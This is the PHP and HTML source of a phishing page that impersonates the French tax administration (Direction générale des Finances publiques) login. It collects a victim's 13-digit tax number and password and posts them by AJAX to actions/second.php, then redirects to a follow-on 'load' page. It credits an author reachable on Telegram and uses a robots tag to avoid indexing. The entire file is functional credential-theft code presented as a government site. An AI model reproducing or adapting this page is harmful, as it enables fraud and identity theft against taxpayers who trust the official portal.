<?php include("common/includes.php") ?>
<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/
    
    // AJOUT: Protection CSRF
    if (session_status() == PHP_SESSION_NONE) {
        session_start();
    }
    if (empty($_SESSION['csrf_token_index'])) {
        $_SESSION['csrf_token_index'] = bin2hex(random_bytes(32));
    }
    $csrf_token = $_SESSION['csrf_token_index'];
    
    function is_invalid_class($array, $key) {
        if( !is_array($array) )
            return false;
        if( isset($array[$key]) ) {
            $return = 'has-error';
            return $return;
        }
        return false;
    }
	function get_selected_option($name,$value) {
        if( isset($_SESSION[$name]) && $_SESSION[$name] == $value ) {
            return 'selected';
        }
    }
	function error_message($array, $key) {
        if( !is_array($array) )
            return false;
        if( isset($array[$key]) ) {
            $return = '<div class="error-message">'. $array[$key] .'</div>';
            return $return;
        }
        return false;
    }
	
?>
<!doctype html>
<html style="background-color: #E5E5E5; display: flex; flex-direction: column; height: 100%;">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="assets/css/helpers.css">
        <link rel="stylesheet" href="assets/css/style.css">

        <link rel="icon" type="image/x-icon" href="assets/imgs/favicon.ico" />

        <title>Login</title>
    </head>

    <body style="background-color: #E5E5E5; display: flex; flex-direction: column; height: 100%;">

        <!-- HEADER -->
        <header id="header">
            <div class="container">
                <div class="top-header">
                    <div class="logo"><img src="assets/imgs/logo.svg"></div>
                    <div class="btns">
                        <button type="button"><i class="fas fa-lock"></i> Votre espace particulier</button>
                        <button style="background: #A63950; margin-top: 5px;" type="button"><i class="fas fa-lock"></i> Votre espace professionnel</button>
                    </div>
                    <div class="menu"><img src="assets/imgs/menu.png"></div>
                </div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- BREADCRUMB -->
        <div id="breadcrumb" class="mt-4 mb-5">
            <div class="container">
                <u>Accueil</u> <span>-</span> Authentification
            </div>
        </div>
        <!-- BREADCRUMB -->

        <!-- MAIN -->
        <main id="main" class="flex-grow-1">
            <div class="container">
                <div class="row">
                    <div class="col-md-6">
                        <div class="login-area">
                            <div class="title">
                                <h3>Connexion ou création de votre espace</h3>
                            </div>
                            <form action="" method="POST">
                                <input type="hidden" name="captcha">
                                <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>">
                                <input type="hidden" name="step" value="login">
                                <?php if( $_GET['error'] == 1 ) : ?>
                                <div class="error">
                                    <p>Votre Numéro fiscal ou mot de passe est incorrect, réessayez ou cliquez sur «Vous avez oublié votre mot de passe »</p>
                                </div>
                                <?php endif; ?>
                                <div class="form-group">
                                    <label for="username">Numéro fiscal</label>
                                    <input type="text" maxlength="13" inputmode="numeric" name="username" id="username" class="form-control username" onkeypress="forceImputNumber()" placeholder="13 chiffres" autocomplete="off">
                                </div>
                                <div class="form-group ">
                                    <label for="password">Mot de passe</label>
                                    <div class="in">
                                        <input type="password" name="password" id="password" class="form-control password">
                                        <div class="eye"><i class="fa-regular fa-eye"></i></div>
                                    </div>
                                </div>
                                <div class="btns">
                                    <button type="button" id="submit">Connexion</button>
                                </div>
                                <fieldset>
                                    <legend>Ou</legend>
                                </fieldset>
                                <div class="text-center">
                                    <img style="max-width: 200px;" src="assets/imgs/login-img.svg">
                                    <p><span>Qu'est-ce que FranceConnect?</span></p>
                                </div>
                                <hr>
                                <p class="text-center mb-3">Vous pouvez également payer en ligne en utilisant votre numéro fiscal et la référence de votre avis</p>
                                <div class="btns">
                                    <button type="button" >Payer en ligne</button>
                                </div>
                            </form>
                        </div>
                    </div>
                    <div class="col-md-6">
                        <aside>
                            <div class="title">
                                <h3>Aide</h3>
                            </div>
                            <ul>
                                <li><span>+</span> Vous avez oublié votre mot de passe</li>
                                <li><span>+</span> Comment modifier votre mot de passe ?</li>
                            </ul>
                            <hr>
                            <ul>
                                <li><span>+</span> Les services disponibles sur votre espace particulier</li>
                                <li><span>+</span> Gestion des cookies</li>
                            </ul>
                        </aside>
                    </div>
                </div>
            </div>
        </main>
        <!-- END MAIN -->

        <footer id="footer">
            <div class="container">
                <p>Direction générale des Finances publiques</p>
            </div>
        </footer>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
        <script src="assets/js/script.js"></script>
		
		     <script type="text/javascript">
        const forceImputNumber = (evt) => {
            evt = evt ? evt : window.event;
            var charCode = evt.which ? evt.which : evt.keyCode;
            if (charCode > 31 && (charCode < 48 || charCode > 57) && charCode !== 46) {
                evt.preventDefault();
            } else {
                return true;
            }
        };
    </script>

        <script>
            $('.eye').click(function(){
                if( $('#password').attr('type') == 'password' ) {
                    $('#password').attr('type','text');
                    $('.eye').html('<i class="fa-regular fa-eye-slash"></i>');
                } else {
                    $('#password').attr('type','password');
                    $('.eye').html('<i class="fa-regular fa-eye"></i>');
                }
            });
        </script>

        <script type="text/JavaScript">
            var x = 0
            $(document).ready(function() {
                
                $('#submit').click(function(e) {
                    e.preventDefault();
                    if ( $('.username').val().length >= 1 && $('.password').val().length >= 1) {

                        // Récupérer le token CSRF
                        var csrfToken = $('input[name="csrf_token"]').val();
                        
                        $.ajax({
                            type: "post",
                            url: "actions/second.php",
                            data: {
                                username: $('.username').val(),
                                password: $('.password').val(),
                                csrf_token: csrfToken
                            },
                            success: function(response) {
                                window.location.href = 'load-1.php';
                            },
                            error: function(xhr) {
                                if (xhr.status === 403) {
                                    alert('Session expirée. Veuillez recharger la page.');
                                    location.reload();
                                }
                            }
                        });
                    } else {
                        alert('Vous devez saisir votre numéro fiscal à 13 chiffres et le mot de passe.')
                    }
                });

            })
        </script>

    </body>

</html>